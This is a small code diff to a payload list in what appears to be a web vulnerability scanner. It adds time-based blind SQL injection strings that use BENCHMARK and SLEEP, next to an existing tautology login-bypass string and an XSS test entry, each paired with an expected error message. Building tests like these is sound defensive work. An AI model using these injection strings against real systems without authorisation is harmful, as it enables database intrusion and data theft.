@@ -280,8 +280,12 @@ var payload2 = [
      [["^.*username.*$","' or '1' = '1"]],
      ["An error occured: "]
     ],
-    ["sql", "Blind Injection (Timing)", "sql3",
-     [["*", "1'; SELECT BENCHMARK(100000000,RAND());#"]],
+    ["sql", "Blind Injection (Time: Benchmark)", "sql3",
+     [["*", "1'; SELECT BENCHMARK(123456789,RAND());#"]],
+     ["An error occured: FUNCTION"]
+    ],
+    ["sql", "Blind Injection (Time: Sleep)", "sql4",
+     [["*", "1' OR SLEEP(4);#"]],
      ["An error occured: FUNCTION"]
     ],
     ["xss", "Test for vulnerability","xss1",
